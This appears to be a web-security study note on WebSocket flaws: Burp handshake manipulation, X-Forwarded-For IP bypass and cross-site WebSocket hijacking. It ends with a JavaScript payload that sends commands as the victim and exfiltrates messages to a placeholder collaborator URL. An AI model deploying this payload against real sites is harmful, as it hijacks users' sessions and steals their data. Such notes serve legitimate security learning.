---
layout: blank
pagetitle: Websockets
---

**Common vulnerabilities**
- Since websockets are just another way of communicating with a webserver, most standard vulnerabilities still apply
- Burp's websocket history and repeater can handle websocket communication

**Manipulating Websocket Handshake**
- Process of manipulating the handshake:
  - Send Websocket message to repeater
  - Click pencil next to URL
  - Choose `clone` for a connected websocket or `reconnect` for a disconnected websocket
    - This will show the details of the handshake request, which can be modified
  - Click `connect` to test out the configured handshake
- Common handshake vulnerabilities:
  - Misplaced trust in HTTP headers for security decisions, like `X-Forwarded-For` or any custom headers
    - `X-Forwarded-For` can sometimes bypass IP restrictions
  - Common session-handling mechanism flaws in the handshake

**Cross-site WebSocket Hijacking**
- Results from cross-domain WebSocket connections from an attacker-controlled site
- Happens when the Websocket handshake relies only on HTTP cookies and doesn't have any CSRF tokens
  - Attacker can set up a malicious site to establish the cross-site websocket connection to read contents of messages
- Payload:

```
<script>
    var ws = new WebSocket('wss://{websocket_rl}');
    ws.onopen = function() {
        ws.send("{command_to_send_as_user}");
    };
    ws.onmessage = function(event) {
        fetch('{collaborator_url}', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```